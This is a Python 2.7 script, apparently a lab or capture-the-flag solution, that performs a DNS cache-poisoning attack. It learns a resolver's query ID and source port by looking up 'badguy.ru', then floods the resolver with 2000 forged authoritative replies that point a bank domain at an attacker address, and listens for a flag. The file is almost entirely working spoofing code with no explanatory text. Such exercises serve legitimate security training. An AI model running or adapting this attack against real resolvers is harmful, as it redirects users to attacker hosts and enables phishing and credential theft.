#!/usr/bin/env python2.7

import socket
from dnslib import *
from threading import Thread
import re

badguyDNSport = 55553
flagPort = 1337
ip_DNS = "192.168.56.101" 
ip_attacker = "192.168.56.103" 
ip_NS = "10.0.0.1"
site = "wwwtest.bankofallan.co.uk"


def flagThread():
	try: #socket to get the Flag
		flag_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		flag_sock.bind((ip_attacker,flagPort))
	except:
		print ("Error opening the Flag socket")
		exit(1)
	
	flag, f = flag_sock.recvfrom(1024)
	print("The flag is :" +flag)


def fake_reply(x): #qr = 1 (Response), aa = 1 (is authoritative), ra = 1 (recursion available)
    return DNSRecord(DNSHeader(id=x,qr=1,aa=1,ra=1),q=DNSQuestion(site),a=RR("bankofallan.co.uk",QTYPE.A,rdata=A(ip_attacker),ttl=1000)).pack()
    
	
#----------------------------------------------------Phase 0 Setup---------------------------------------------------------
try: #socket to make DNS request
	sock_dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock_dns.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
except:
	print ("Error opening the DNS socket")
	exit(1);
print ("DNS socket: OK")

try: #socket to listen the port 53 for DNS request
	dns_listen=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	dns_listen.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	dns_listen.bind(("",badguyDNSport))
except:
	print ("Error opening the DNS listen socket")
	exit(1)
print ("DNS listen socket: OK")

try: #socket to simulate DNS replies
	fakeDNS_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	fakeDNS_sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)	
	fakeDNS_sock.bind((ip_NS,53))
except:
	print ("Error opening the Fake DNS socket")
	exit(1)
print ("Fake DNS socket: OK")


thread = Thread(target = flagThread, args = ())
thread.start()


while (True):
    print("...")
    #----------------------------------------------------Phase 1 Request to badguy.ru----------------------------------------  
    sock_dns.sendto(DNSRecord.question("badguy.ru").pack(), (ip_DNS,53))
    
    #---------------------------------------------------Phase 2 Parsing the response-----------------------------------------
    response_1 = dns_listen.recvfrom(512)
    header = str(DNSRecord.parse(response_1[0]))
    
    sourceport = response_1[1][1]
    queryid = int(re.search(r"(id: )([0-9]*)(\n)",header).group(2))
    
    #---------------------------------------------------Phase 3 Forge the 2000 fake_replies----------------------------------	
    fakereplies_array = [fake_reply(i) for i in range(queryid,queryid+2000)]
  
	#---------------------------------------------------Phase 4 Request for wwwtest.bankofalln.co.uk-------------------------
    sock_dns.sendto(DNSRecord.question(site).pack(),(ip_DNS,53))
    
    #---------------------------------------------------Phase 5 Send the fake replies-----------------------------------------
    for reply in fakereplies_array: 
        fakeDNS_sock.sendto(reply,(ip_DNS,sourceport))
            

	#Check if I've found the flag
    if not thread.isAlive():
		thread.join()
		break

